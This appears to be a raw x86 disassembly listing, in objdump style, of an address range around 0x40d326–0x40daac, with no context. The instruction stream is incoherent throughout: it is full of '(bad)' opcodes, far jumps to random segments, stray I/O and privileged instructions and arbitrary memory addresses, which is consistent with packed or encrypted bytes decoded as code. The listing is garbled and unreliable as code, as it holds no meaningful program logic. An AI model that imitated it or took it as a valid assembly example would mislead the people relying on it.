  40d326:	jge    0x40d357
  40d328:	jno    0x40d332
  40d32a:	leave  
  40d32b:	sahf   
  40d32c:	add    eax,DWORD PTR ds:0xdc1e9d7b
  40d332:	inc    ebx
  40d333:	out    0x2a,al
  40d335:	cs push 0x76
  40d338:	in     eax,dx
  40d339:	push   ss
  40d33a:	adc    DWORD PTR [esi+0x7c6230dd],ecx
  40d340:	inc    ebx
  40d341:	sbb    al,dl
  40d343:	arpl   WORD PTR [eax-0x65],cx
  40d346:	cwde   
  40d347:	adc    al,0x2b
  40d349:	xchg   DWORD PTR [ebx-0x6bbca488],esi
  40d34f:	jb     0x40d311
  40d351:	push   esp
  40d352:	stos   DWORD PTR es:[edi],eax
  40d353:	enter  0xfeb3,0x5e
  40d357:	repnz pop ebp
  40d359:	xchg   edi,eax
  40d35a:	leave  
  40d35b:	push   0xffffffb6
  40d35d:	mov    cl,0x6d
  40d35f:	dec    edx
  40d360:	fld    DWORD PTR [eax+0xf]
  40d363:	in     eax,dx
  40d364:	cmp    eax,ebx
  40d366:	add    al,0x2f
  40d368:	fcom   st(2)
  40d36a:	sar    BYTE PTR [ebp+ebx*8+0x3ded9948],1
  40d371:	pop    edx
  40d372:	loopne 0x40d350
  40d374:	and    eax,0xa39215c
  40d379:	push   0x99d1aa89
  40d37e:	aas    
  40d37f:	pop    es
  40d380:	cmp    ecx,DWORD PTR [eax-0x6a60b029]
  40d386:	xchg   edx,eax
  40d387:	dec    edx
  40d388:	adc    DWORD PTR [edx],ebx
  40d38a:	cmc    
  40d38b:	enter  0xb07e,0xec
  40d38f:	(bad)  
  40d390:	js     0x40d40a
  40d392:	pop    ecx
  40d393:	sub    DWORD PTR [edi-0x46],ecx
  40d396:	(bad)  
  40d397:	jge    0x40d3d6
  40d399:	pop    esi
  40d39a:	and    ebp,DWORD PTR [ebp+0x6aef2cde]
  40d3a0:	stc    
  40d3a1:	repz push gs
  40d3a4:	jmp    0x3c47:0x67f46ab0
  40d3ab:	add    eax,0x1c0b666
  40d3b0:	push   cs
  40d3b1:	mov    ch,0x9d
  40d3b3:	ins    BYTE PTR es:[edi],dx
  40d3b4:	and    DWORD PTR [edi+0xf],ecx
  40d3b7:	fs sahf 
  40d3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ba:	and    dh,cl
  40d3bc:	add    BYTE PTR [ebp-0x37b69480],0x74
  40d3c3:	test   al,0x67
  40d3c5:	gs mov edx,0xc732fd88
  40d3cb:	(bad)
  40d3ce:	shr    DWORD PTR [esp+ecx*1-0x1c15b26d],0x20
  40d3d6:	lds    edi,FWORD PTR [ebp-0x3c]
  40d3d9:	jmp    FWORD PTR [esi-0x2a1f09e5]
  40d3df:	cwde   
  40d3e0:	loope  0x40d435
  40d3e2:	cmp    BYTE PTR [ebx],cl
  40d3e4:	mov    BYTE PTR [ecx-0x6eb69954],bh
  40d3ea:	mov    esi,ecx
  40d3ec:	sahf   
  40d3ed:	add    edx,DWORD PTR [edx+0x400a76b2]
  40d3f3:	call   0x57a28cdc
  40d3f8:	mov    WORD PTR [edx+0xe],?
  40d3fb:	xchg   BYTE PTR [eax+0x67b3eb19],bl
  40d401:	jp     0x40d3cd
  40d403:	rol    DWORD PTR [esi+0x6afbf2b2],0xb2
  40d40a:	push   ebp
  40d40b:	(bad)  [edx]
  40d40d:	mov    ebx,0xb5a77eff
  40d412:	mov    ds:0xa9ea6929,eax
  40d417:	xchg   DWORD PTR [eax+esi*2+0x25a3969e],esi
  40d41e:	mov    eax,0xc3061c67
  40d423:	pop    esi
  40d424:	push   esi
  40d425:	in     al,dx
  40d426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d427:	push   gs
  40d429:	arpl   sp,bp
  40d42b:	mov    ah,0xf5
  40d42d:	shl    DWORD PTR [edi+0x6ede1738],cl
  40d433:	outs   dx,BYTE PTR ds:[esi]
  40d434:	or     dh,BYTE PTR [edi+0x43ab2181]
  40d43a:	bound  edx,QWORD PTR [eax-0x11a3ab8b]
  40d440:	jbe    0x40d449
  40d442:	not    DWORD PTR [ebp-0x4f0ef9cd]
  40d448:	mov    bh,0x44
  40d44a:	daa    
  40d44b:	xchg   edx,eax
  40d44c:	fs push ss
  40d44e:	push   eax
  40d44f:	dec    edx
  40d450:	jnp    0x40d466
  40d452:	xchg   esp,eax
  40d453:	adc    eax,0xe0ca48c9
  40d458:	sbb    al,BYTE PTR [ecx+0x7a]
  40d45b:	mov    bl,0xbe
  40d45d:	add    eax,0x9d7db881
  40d462:	loop   0x40d42f
  40d464:	mov    esp,0xa3fe99bc
  40d469:	fcom   st(3)
  40d46b:	mov    bh,0x5f
  40d46d:	fimul  DWORD PTR [eax+0x384cf500]
  40d473:	cmp    al,0xd9
  40d475:	(bad)  [ebx-0x2cb18127]
  40d47b:	mov    eax,0xbd8f54cf
  40d480:	stos   BYTE PTR es:[edi],al
  40d481:	imul   ebp,DWORD PTR [ebp+0x7c],0xffffff82
  40d485:	into   
  40d486:	mov    bl,0x61
  40d488:	xchg   ecx,eax
  40d489:	xchg   DWORD PTR [ecx],eax
  40d48b:	(bad)  
  40d48d:	mov    DWORD PTR [ebx],ebx
  40d48f:	jmp    0xe6781911
  40d494:	int3   
  40d495:	lea    esi,[edi-0x61b8f1f]
  40d49b:	lea    ebp,[eax+eiz*8]
  40d49e:	pop    ecx
  40d49f:	dec    edx
  40d4a0:	in     al,0x55
  40d4a2:	add    eax,0x83fb5d98
  40d4a7:	xor    DWORD PTR [esi],ebp
  40d4a9:	pop    ebx
  40d4aa:	push   esp
  40d4ab:	test   BYTE PTR ds:0xf0bb791b,dh
  40d4b1:	stos   DWORD PTR es:[edi],eax
  40d4b2:	es xchg esp,eax
  40d4b4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40d4b6:	cdq    
  40d4b7:	lahf   
  40d4b8:	stos   DWORD PTR es:[edi],eax
  40d4b9:	push   ds
  40d4ba:	mov    cs,WORD PTR [eax+0x41b65efa]
  40d4c0:	fsub   QWORD PTR [eax-0x7df3d7f2]
  40d4c6:	xchg   ebp,eax
  40d4c7:	aaa    
  40d4c8:	in     eax,dx
  40d4c9:	lods   al,BYTE PTR ds:[esi]
  40d4ca:	dec    edx
  40d4cb:	adc    ch,BYTE PTR [eax+0x20237309]
  40d4d1:	xlat   BYTE PTR ds:[ebx]
  40d4d2:	aad    0xb0
  40d4d4:	mov    bl,bh
  40d4d6:	cwde   
  40d4d7:	sub    eax,0x58f0b91f
  40d4dc:	fstp   DWORD PTR [esi-0x60]
  40d4df:	fnstcw WORD PTR [ecx+esi*8]
  40d4e2:	xchg   bl,dl
  40d4e4:	mov    edi,DWORD PTR [edx]
  40d4e6:	in     eax,dx
  40d4e7:	pop    edx
  40d4e8:	mov    esi,0xb6b44a54
  40d4ed:	push   ebp
  40d4ee:	sbb    DWORD PTR [edi],0xffffffe8
  40d4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f2:	or     ch,BYTE PTR [ebx+ebx*1+0x6c]
  40d4f6:	int3   
  40d4f7:	sbb    al,bh
  40d4f9:	jle    0x40d4a2
  40d4fb:	fs pop edi
  40d4fd:	pop    DWORD PTR [edx+0x13]
  40d500:	add    ebx,ebx
  40d502:	cdq    
  40d503:	sbb    al,cl
  40d505:	into   
  40d506:	lods   eax,DWORD PTR ds:[esi]
  40d507:	and    esp,DWORD PTR [ebx+0x4093eac5]
  40d50d:	mov    bl,0x93
  40d50f:	repnz pop ecx
  40d511:	into   
  40d512:	sub    eax,0x8ae82d4c
  40d517:	mov    DWORD PTR [ecx],0xe1c15bdf
  40d51d:	dec    BYTE PTR [ebx+0x3dc9ec10]
  40d523:	or     ebp,DWORD PTR [edx+0x2f781edd]
  40d529:	int    0x88
  40d52b:	les    esp,FWORD PTR [esi-0x35d0056a]
  40d531:	sbb    dl,BYTE PTR [edx+edx*1-0x43df4a70]
  40d538:	adc    cl,BYTE PTR [eax]
  40d53a:	sar    dl,1
  40d53c:	js     0x40d4ed
  40d53e:	int    0xc0
  40d540:	mov    eax,0x1cea3668
  40d545:	sbb    ch,bh
  40d547:	jnp    0x40d554
  40d549:	adc    DWORD PTR [eax+0x1c],ebx
  40d54c:	pop    ss
  40d54d:	pop    esi
  40d54e:	push   0x57
  40d550:	add    cl,ah
  40d552:	call   0xd41e88dc
  40d557:	ds jnp 0x40d519
  40d55a:	push   esp
  40d55b:	xlat   BYTE PTR ds:[ebx]
  40d55c:	cs test al,0x95
  40d55f:	mov    ebx,0x6767d65d
  40d564:	sub    edx,DWORD PTR [esi+0xf]
  40d567:	cmp    DWORD PTR [ecx],esp
  40d569:	adc    dh,0x65
  40d56c:	lock popa 
  40d56e:	sub    bh,BYTE PTR [edx-0x54]
  40d571:	aaa    
  40d572:	mov    ebx,ebp
  40d574:	cmp    ah,ch
  40d576:	not    BYTE PTR [ecx-0x38]
  40d579:	mov    edx,0xa5036b28
  40d57e:	mov    cl,BYTE PTR [eax+0x24]
  40d581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d582:	jae    0x40d520
  40d584:	fbstp  TBYTE PTR [eax]
  40d586:	inc    ebp
  40d587:	(bad)  
  40d589:	push   ecx
  40d58a:	scas   eax,DWORD PTR es:[edi]
  40d58b:	jne    0x40d572
  40d58d:	loop   0x40d566
  40d58f:	adc    dh,BYTE PTR [ebp-0x7db512de]
  40d595:	pop    es
  40d596:	xchg   edi,eax
  40d597:	mov    fs,WORD PTR [eax+0x76f5d50a]
  40d59d:	xchg   BYTE PTR [esi+edi*1],ch
  40d5a0:	jmp    DWORD PTR [edi+0x1418fe7c]
  40d5a6:	or     eax,edx
  40d5a8:	popa   
  40d5a9:	jp     0x40d58b
  40d5ab:	ins    DWORD PTR es:[edi],dx
  40d5ac:	test   esi,ecx
  40d5ae:	ins    BYTE PTR es:[edi],dx
  40d5af:	stos   DWORD PTR es:[edi],eax
  40d5b0:	imul   esi,DWORD PTR [edx+0x1d2cc320],0xfffffffe
  40d5b7:	lods   eax,DWORD PTR ds:[esi]
  40d5b8:	cmp    al,0x4f
  40d5ba:	push   edi
  40d5bb:	xchg   BYTE PTR [ebx],bl
  40d5bd:	push   esi
  40d5be:	cdq    
  40d5bf:	push   es
  40d5c0:	repz rcl DWORD PTR [eax-0x32cc572f],0xd
  40d5c8:	int    0xe3
  40d5ca:	sbb    DWORD PTR [eax],0x57
  40d5cd:	loopne 0x40d578
  40d5cf:	scas   eax,DWORD PTR es:[edi]
  40d5d0:	add    dh,BYTE PTR [eax-0x4f436876]
  40d5d6:	mov    dh,0x4d
  40d5d8:	adc    al,BYTE PTR [edx]
  40d5da:	adc    esi,DWORD PTR [edx-0x29eec39c]
  40d5e0:	enter  0x7361,0x8c
  40d5e4:	test   al,0xd9
  40d5e6:	cmp    ebx,ebp
  40d5e8:	lock repz test bh,ah
  40d5ec:	mov    dh,0xbe
  40d5ee:	jmp    0xa660:0xf04e6424
  40d5f5:	adc    edx,DWORD PTR [ebp+0x41844ffa]
  40d5fb:	jge    0x40d5cd
  40d5fd:	stos   BYTE PTR es:[edi],al
  40d5fe:	push   0xffffff98
  40d600:	xchg   ebx,eax
  40d601:	adc    eax,0xd80f8b31
  40d606:	dec    ebp
  40d607:	(bad)  
  40d608:	push   es
  40d609:	and    edx,DWORD PTR [eax]
  40d60b:	int    0x8a
  40d60d:	cdq    
  40d60e:	call   0xce5171ab
  40d613:	mov    esi,0xc6226c3d
  40d618:	call   0xee2c:0x2678358c
  40d61f:	mov    bh,al
  40d621:	mov    eax,0x65d7ac24
  40d626:	mov    ah,0xf
  40d628:	mov    dh,0x60
  40d62a:	mov    eax,ds:0xd9376de5
  40d62f:	ret    0x818e
  40d632:	push   ss
  40d633:	jne    0x40d656
  40d635:	imul   ebx,DWORD PTR [ebx+0x49],0x3e272d54
  40d63c:	leave  
  40d63d:	out    0xe,al
  40d63f:	dec    ecx
  40d640:	mov    eax,ds:0x87407b83
  40d645:	outs   dx,DWORD PTR ds:[esi]
  40d646:	sbb    DWORD PTR [ebp+0x28],0x4
  40d64a:	(bad)  
  40d64b:	mov    eax,ds:0xa75e246b
  40d650:	dec    ebp
  40d651:	cmp    BYTE PTR [eax+eiz*8],cl
  40d654:	dec    ebx
  40d655:	neg    BYTE PTR [edx]
  40d657:	mov    bl,0x5e
  40d659:	and    ch,0x37
  40d65c:	ror    edi,0xbd
  40d65f:	and    bh,BYTE PTR [edi]
  40d661:	gs call 0x9189:0x84a8e616
  40d669:	jge    0x40d6ab
  40d66b:	pop    ebx
  40d66c:	test   WORD PTR [esi+0x683fbf8e],bp
  40d673:	bound  ebp,QWORD PTR [ecx+0x54]
  40d676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d677:	shl    BYTE PTR [ebp+0x45ccf18e],0xc1
  40d67e:	pusha  
  40d67f:	sub    eax,0x1578abca
  40d684:	mov    ebx,0x343d1561
  40d689:	neg    BYTE PTR [eax]
  40d68b:	xchg   ecx,eax
  40d68c:	add    eax,0x704a4d03
  40d691:	mov    al,ds:0x321cd21d
  40d696:	js     0x40d664
  40d698:	mov    esp,0x1cf6ee05
  40d69d:	jmp    0x40d64e
  40d69f:	dec    ecx
  40d6a0:	pop    edx
  40d6a1:	xor    al,0xa2
  40d6a3:	cwde   
  40d6a4:	stc    
  40d6a5:	mov    al,ds:0x64758a04
  40d6aa:	mov    ch,BYTE PTR [ebx-0x1]
  40d6ad:	dec    esp
  40d6ae:	shl    DWORD PTR [esi-0x35],0x51
  40d6b2:	dec    eax
  40d6b3:	pop    ss
  40d6b4:	inc    esp
  40d6b5:	int    0x61
  40d6b7:	mov    ecx,0xb4ea3ace
  40d6bc:	sbb    BYTE PTR [ebp-0x22],ch
  40d6bf:	aad    0x2a
  40d6c1:	ins    BYTE PTR es:[edi],dx
  40d6c2:	mov    edx,0x1d3d068
  40d6c7:	mov    cl,0x28
  40d6c9:	mov    bl,0xe8
  40d6cb:	aam    0xe6
  40d6cd:	or     eax,0x6f6ce1b4
  40d6d2:	lods   al,BYTE PTR ds:[esi]
  40d6d3:	jne    0x40d662
  40d6d5:	(bad)  
  40d6d7:	xor    al,0x31
  40d6d9:	loope  0x40d757
  40d6db:	outs   dx,DWORD PTR ds:[esi]
  40d6dc:	xchg   esi,eax
  40d6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6de:	les    edx,FWORD PTR fs:[eax+eiz*4]
  40d6e2:	ins    DWORD PTR es:[edi],dx
  40d6e3:	push   ebp
  40d6e4:	push   ebx
  40d6e5:	cmp    edx,DWORD PTR [ebx]
  40d6e7:	lock outs dx,DWORD PTR ds:[esi]
  40d6e9:	adc    eax,DWORD PTR [esi]
  40d6eb:	sub    al,0x23
  40d6ed:	or     DWORD PTR [esi-0x60],ebx
  40d6f0:	data16 loope 0x40d702
  40d6f3:	mov    dh,0xb3
  40d6f5:	outs   dx,BYTE PTR ds:[esi]
  40d6f6:	sbb    ah,BYTE PTR ds:0x1fe98116
  40d6fc:	hlt    
  40d6fd:	outs   dx,DWORD PTR ds:[esi]
  40d6fe:	in     eax,dx
  40d6ff:	or     al,0x59
  40d701:	stos   BYTE PTR es:[edi],al
  40d702:	js     0x40d6a0
  40d704:	cmp    BYTE PTR [ecx+0x3efdabb5],0x94
  40d70b:	dec    ecx
  40d70c:	test   al,0x3
  40d70e:	das    
  40d70f:	rcr    BYTE PTR [eax],cl
  40d711:	push   esi
  40d712:	dec    ebx
  40d713:	test   BYTE PTR [esi-0x39e56d8e],ch
  40d719:	dec    esp
  40d71a:	aas    
  40d71b:	dec    di
  40d71d:	add    ebp,edi
  40d71f:	shl    al,cl
  40d721:	arpl   WORD PTR [edi],sp
  40d723:	and    BYTE PTR [edi-0x130f2895],bl
  40d729:	out    0x70,al
  40d72b:	call   0x52b5:0x331f908b
  40d732:	clc    
  40d733:	and    eax,0x844b5f45
  40d738:	mov    ch,0x4b
  40d73a:	and    ebx,DWORD PTR [ebx]
  40d73c:	inc    edi
  40d73d:	call   0x68b7:0x6987b4
  40d744:	pop    ds
  40d745:	call   0x8ba1:0xcd103a87
  40d74c:	or     bh,BYTE PTR [esi+0x65]
  40d74f:	cld    
  40d750:	jns    0x40d740
  40d752:	lods   eax,DWORD PTR ds:[si]
  40d754:	dec    ebx
  40d755:	push   0xffffff83
  40d757:	arpl   WORD PTR gs:[esi-0x78509ef3],di
  40d75e:	fistp  DWORD PTR [si]
  40d761:	push   ebx
  40d762:	sbb    ch,BYTE PTR [esi]
  40d764:	inc    esi
  40d765:	mov    esi,0xee9a7bed
  40d76a:	push   ds
  40d76b:	cwde   
  40d76c:	fidiv  DWORD PTR [ebx+edi*1-0x1ab15998]
  40d773:	in     eax,0xc0
  40d775:	push   ds
  40d776:	inc    esp
  40d777:	jg     0x40d74a
  40d779:	(bad)  
  40d77a:	mov    esi,0x2a3c5a71
  40d77f:	mov    cl,0x56
  40d781:	les    edx,FWORD PTR [ebp+0x58]
  40d784:	mov    ebp,0x69bdb914
  40d789:	mov    edi,0xc2b139aa
  40d78e:	xchg   ebp,eax
  40d78f:	les    ebx,FWORD PTR [ebp-0x3c5e19fc]
  40d795:	outs   dx,BYTE PTR ds:[esi]
  40d796:	xchg   ah,al
  40d798:	fisttp WORD PTR [esi]
  40d79a:	pop    ebp
  40d79b:	fldenv [edi]
  40d79d:	call   DWORD PTR [edi+0x5d]
  40d7a0:	aad    0x8c
  40d7a2:	push   0x32ebdd90
  40d7a7:	adc    DWORD PTR [ecx],ebp
  40d7a9:	aad    0x31
  40d7ab:	mov    ds:0x94e45e2f,eax
  40d7b0:	and    eax,0x1fb91fab
  40d7b5:	mov    dl,BYTE PTR [ebx+0x51]
  40d7b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7b9:	push   ebp
  40d7ba:	jmp    0x4c43:0xc0a994ec
  40d7c1:	loop   0x40d7d8
  40d7c3:	xor    al,0x89
  40d7c5:	das    
  40d7c6:	xchg   BYTE PTR [edx],ah
  40d7c8:	shl    BYTE PTR [ebx],cl
  40d7ca:	mov    al,0x13
  40d7cc:	sub    eax,0x3151eb6e
  40d7d1:	imul   DWORD PTR [ebp+0x7d8b9778]
  40d7d7:	push   0x6f31e8e7
  40d7dc:	mov    cl,0x57
  40d7de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7df:	bound  esi,QWORD PTR [edi-0x19]
  40d7e2:	jecxz  0x40d823
  40d7e4:	outs   dx,DWORD PTR ds:[esi]
  40d7e5:	mov    ecx,0x7899f9df
  40d7ea:	fbld   TBYTE PTR [eax]
  40d7ec:	mov    dl,BYTE PTR [ebx]
  40d7ee:	and    edi,DWORD PTR ss:[eax-0x6136ac54]
  40d7f5:	and    DWORD PTR [edi+0x64],ecx
  40d7f8:	or     eax,0x92d85ced
  40d7fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7fe:	xor    cl,dh
  40d800:	fwait
  40d801:	and    ecx,eax
  40d803:	in     al,0x60
  40d805:	and    BYTE PTR [ecx-0x40308bca],al
  40d80b:	stos   DWORD PTR es:[edi],eax
  40d80c:	movhlps xmm0,xmm1
  40d80f:	dec    eax
  40d810:	xchg   BYTE PTR [eax+0x558d6fd],dl
  40d816:	jne    0x40d7a3
  40d818:	out    dx,eax
  40d819:	adc    DWORD PTR [edx],ecx
  40d81b:	jmp    0x1f4a:0x8ad8de99
  40d822:	std    
  40d823:	and    DWORD PTR [ebx+esi*2+0x7ea198e1],eax
  40d82a:	xor    DWORD PTR [ecx-0x717cf356],esp
  40d830:	es inc eax
  40d832:	mov    al,0xe6
  40d834:	jmp    0x40d846
  40d836:	adc    DWORD PTR [eax],0x6fa0d6eb
  40d83c:	push   ebp
  40d83d:	mov    al,BYTE PTR [ebp+0x6]
  40d840:	cmc    
  40d841:	aas    
  40d842:	cmp    al,ch
  40d844:	fdivr  QWORD PTR ds:0xe653eacc
  40d84a:	xor    cl,BYTE PTR [esi+0xe]
  40d84d:	fst    DWORD PTR [ebx-0x39]
  40d850:	and    eax,0xee742454
  40d855:	aam    0xe1
  40d857:	jb     0x40d7e6
  40d859:	(bad)  
  40d85a:	adc    dl,BYTE PTR [edx+eiz*1+0x1f2aa48e]
  40d861:	lods   al,BYTE PTR ds:[esi]
  40d862:	add    DWORD PTR [eax+0x1a],0xe2dd2fee
  40d869:	mov    ebx,0x9b0e806
  40d86e:	jmp    0x40d7f3
  40d870:	fadd   QWORD PTR [ebp-0xec41e78]
  40d876:	jg     0x40d85e
  40d878:	repz inc ecx
  40d87a:	xchg   ecx,eax
  40d87b:	cld    
  40d87c:	jae    0x40d8e9
  40d87e:	inc    edi
  40d87f:	xchg   esi,eax
  40d880:	scas   eax,DWORD PTR es:[di]
  40d882:	push   edi
  40d883:	outs   dx,DWORD PTR ds:[esi]
  40d884:	add    BYTE PTR [eax],bh
  40d886:	xchg   ebx,eax
  40d887:	xor    bh,cl
  40d889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d88a:	sbb    edx,DWORD PTR [esp+esi*4-0x6ccf10a6]
  40d891:	test   al,0x4d
  40d893:	cmp    al,0x7f
  40d895:	xchg   esp,eax
  40d896:	and    DWORD PTR [edi-0x4dd698e4],edx
  40d89c:	xchg   edx,eax
  40d89d:	(bad)  
  40d89e:	cmp    esi,eax
  40d8a0:	mov    ah,BYTE PTR [edi+0x1]
  40d8a3:	push   eax
  40d8a4:	ss mov dh,0x87
  40d8a7:	jne    0x40d8ba
  40d8a9:	ds push edi
  40d8ab:	jp     0x40d843
  40d8ad:	jg     0x40d8be
  40d8af:	pop    ds
  40d8b0:	push   esp
  40d8b1:	xor    BYTE PTR [ecx+0x7c],cl
  40d8b4:	mov    al,ds:0xca40c912
  40d8b9:	in     eax,0x20
  40d8bb:	clc    
  40d8bc:	aad    0x99
  40d8be:	div    DWORD PTR [ebx+0x5a]
  40d8c1:	pop    ebp
  40d8c2:	sub    esp,DWORD PTR [esi+0x53]
  40d8c5:	enter  0xdded,0x75
  40d8c9:	dec    edx
  40d8ca:	fidivr DWORD PTR [ecx-0x375ffb7b]
  40d8d0:	sub    DWORD PTR [esi-0x7b9d502e],esi
  40d8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8d7:	outs   dx,BYTE PTR ds:[esi]
  40d8d8:	aam    0x2f
  40d8da:	sub    DWORD PTR [eax+0x39811858],esi
  40d8e0:	test   eax,0x8f74b8db
  40d8e5:	icebp  
  40d8e6:	mov    ss,WORD PTR [eax]
  40d8e8:	test   al,0x42
  40d8ea:	xchg   ecx,eax
  40d8eb:	add    eax,0xa3738673
  40d8f0:	addr16 mov esi,0xb2752c3a
  40d8f6:	mov    BYTE PTR [esp+edx*8],dh
  40d8f9:	and    ebx,eax
  40d8fb:	inc    ecx
  40d8fc:	std    
  40d8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8fe:	cmp    al,0x88
  40d900:	push   0x4c91bf8b
  40d905:	inc    edi
  40d906:	pop    ebx
  40d907:	in     al,dx
  40d908:	jno    0x40d8e6
  40d90a:	inc    ecx
  40d90b:	fwait
  40d90c:	xor    eax,0x24a06a0f
  40d911:	fiadd  DWORD PTR [ecx+0x5]
  40d914:	cs in  eax,dx
  40d916:	adc    eax,0x36ce75de
  40d91b:	cmp    ecx,DWORD PTR [esi+0x1]
  40d91e:	pop    ebx
  40d91f:	sub    al,0x4
  40d921:	loope  0x40d9a2
  40d923:	dec    edx
  40d924:	es jg  0x40d8d5
  40d927:	retf   
  40d928:	inc    esi
  40d929:	aas    
  40d92a:	in     eax,0x9b
  40d92c:	pusha  
  40d92d:	loopne 0x40d99d
  40d92f:	imul   edx,DWORD PTR [eax-0x52],0x25
  40d933:	xlat   BYTE PTR ds:[ebx]
  40d934:	lea    ecx,[ecx]
  40d936:	idiv   DWORD PTR [edx+0x30]
  40d939:	ror    BYTE PTR [ebx-0x2f],cl
  40d93c:	inc    eax
  40d93d:	dec    ecx
  40d93e:	adc    eax,0xdd3d985c
  40d943:	push   es
  40d944:	(bad)  
  40d945:	imul   eax,ebp,0xffffffb7
  40d948:	in     al,dx
  40d949:	xlat   BYTE PTR ds:[ebx]
  40d94a:	scas   al,BYTE PTR es:[edi]
  40d94b:	sub    al,0x28
  40d94d:	pop    ecx
  40d94e:	imul   edi,DWORD PTR [edi+0xe],0xce567a26
  40d955:	rcl    bl,1
  40d957:	xchg   ebx,eax
  40d958:	arpl   bx,sp
  40d95a:	cmp    BYTE PTR [edx+0x75],ah
  40d95d:	pusha  
  40d95e:	cld    
  40d95f:	inc    ebx
  40d960:	cmp    DWORD PTR [edx+edx*4+0x734e1e92],ebp
  40d967:	movlps xmm5,QWORD PTR [edi+ecx*8]
  40d96b:	pop    es
  40d96c:	call   0x7096c91b
  40d971:	popa   
  40d972:	icebp  
  40d973:	popa   
  40d974:	and    dh,dl
  40d976:	mov    cl,0xea
  40d978:	jg     0x40d92c
  40d97a:	or     bl,BYTE PTR [esi+0x637c3cfe]
  40d980:	sbb    BYTE PTR [ecx+ebp*8+0x358ac5d0],ah
  40d987:	mov    DWORD PTR [eax-0x4fda531e],0x4579aa8b
  40d991:	rcl    BYTE PTR [eax],0xa
  40d994:	or     eax,0xd1367cf5
  40d999:	xor    sp,sp
  40d99c:	mov    dl,0xf2
  40d99e:	iret   
  40d99f:	jecxz  0x40d947
  40d9a1:	cwde   
  40d9a2:	(bad)  
  40d9a3:	adc    esp,DWORD PTR [ecx+0x56]
  40d9a6:	dec    edx
  40d9a7:	xchg   edx,eax
  40d9a8:	call   0x4a0aa37d
  40d9ad:	retf   0x2910
  40d9b0:	sub    ch,al
  40d9b2:	push   ss
  40d9b3:	lea    ebp,[edx-0x30]
  40d9b6:	adc    DWORD PTR [ecx],edx
  40d9b8:	scas   eax,DWORD PTR es:[edi]
  40d9b9:	icebp  
  40d9ba:	jge    0x40d93d
  40d9bc:	and    dl,BYTE PTR ds:0x37279181
  40d9c2:	jne    0x40da1e
  40d9c4:	popf   
  40d9c5:	jmp    0x40d9ba
  40d9c7:	loope  0x40da02
  40d9c9:	mov    eax,0x6a48b652
  40d9ce:	ja     0x40da43
  40d9d0:	in     al,dx
  40d9d1:	dec    ebp
  40d9d2:	pop    es
  40d9d3:	leave  
  40d9d4:	dec    esi
  40d9d5:	ja     0x40d999
  40d9d7:	idiv   BYTE PTR [ebx-0x28]
  40d9da:	or     al,0x2b
  40d9dc:	sub    bh,BYTE PTR [ebx-0x7ab49db6]
  40d9e2:	and    ebx,edi
  40d9e4:	(bad)  
  40d9e5:	cld    
  40d9e6:	imul   edx,eax,0x558744fa
  40d9ec:	enter  0xcee4,0x92
  40d9f0:	push   esp
  40d9f1:	test   dl,al
  40d9f3:	pop    es
  40d9f4:	lods   al,BYTE PTR ds:[esi]
  40d9f5:	loope  0x40d999
  40d9f7:	cwde   
  40d9f8:	pop    ebp
  40d9f9:	jmp    0x40da3a
  40d9fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9fc:	jae    0x40da44
  40d9fe:	mov    ds:0xc7629eb8,eax
  40da03:	push   ebx
  40da04:	inc    BYTE PTR [esi+eax*1-0x4c16412e]
  40da0b:	pop    ebx
  40da0c:	jo     0x40d9fe
  40da0e:	test   eax,edi
  40da10:	pop    ds
  40da11:	ja     0x40d9ca
  40da13:	aas    
  40da14:	into   
  40da15:	repz pop es
  40da17:	popa   
  40da18:	fwait
  40da19:	dec    edx
  40da1a:	xchg   ebx,eax
  40da1b:	fwait
  40da1c:	ror    DWORD PTR [eax],0xfe
  40da1f:	scas   eax,DWORD PTR es:[edi]
  40da20:	int3   
  40da21:	push   edx
  40da22:	fstp   st(7)
  40da24:	dec    esp
  40da25:	std    
  40da26:	add    edi,DWORD PTR [edx+0x64]
  40da29:	pop    edi
  40da2a:	stc    
  40da2b:	lods   eax,DWORD PTR ds:[esi]
  40da2c:	mov    esi,0xd649cf86
  40da31:	pop    esi
  40da32:	js     0x40d9fb
  40da34:	and    eax,0x1e4d8254
  40da39:	jmp    0x22d5:0xa481746b
  40da40:	or     dx,cx
  40da43:	dec    eax
  40da44:	push   ss
  40da45:	sbb    ah,BYTE PTR [edi+0x1d]
  40da48:	je     0x40da5d
  40da4a:	or     BYTE PTR [esi+0x9],bl
  40da4d:	and    eax,0x1419e0c7
  40da52:	pop    sp
  40da54:	retf   0x510d
  40da57:	outs   dx,BYTE PTR es:[esi]
  40da59:	out    0x8c,eax
  40da5b:	jecxz  0x40da2e
  40da5d:	shl    BYTE PTR fs:[esi+0x2e6c7a1f],cl
  40da64:	shl    WORD PTR [ebx+edi*2],1
  40da68:	addr16 enter 0xa9d9,0xa1
  40da6d:	jge    0x40daa0
  40da6f:	push   cs
  40da70:	out    dx,eax
  40da71:	pop    es
  40da72:	pop    edx
  40da73:	pop    esp
  40da74:	fld    st(2)
  40da76:	cld    
  40da77:	loope  0x40da4a
  40da79:	push   0xe734f332
  40da7e:	add    ecx,esp
  40da80:	add    DWORD PTR [esi-0x3c3e5b28],0xc04bfe17
  40da8a:	data16 xor BYTE PTR [ebp+0x5],bl
  40da8e:	ret    
  40da8f:	aam    0xb
  40da91:	jnp    0x40da65
  40da93:	into   
  40da94:	scas   al,BYTE PTR es:[edi]
  40da95:	mov    dh,0xb7
  40da97:	shr    DWORD PTR [eax+0x61f38ec0],1
  40da9d:	repnz and BYTE PTR [edx],0xae
  40daa1:	pushf  
  40daa2:	(bad)  
  40daa3:	data16 je 0x40dafc
  40daa6:	out    0x9,eax
  40daa8:	lds    esi,FWORD PTR [edi+edx*1-0x13]
  40daac:	fidivr WORD PTR [eax]
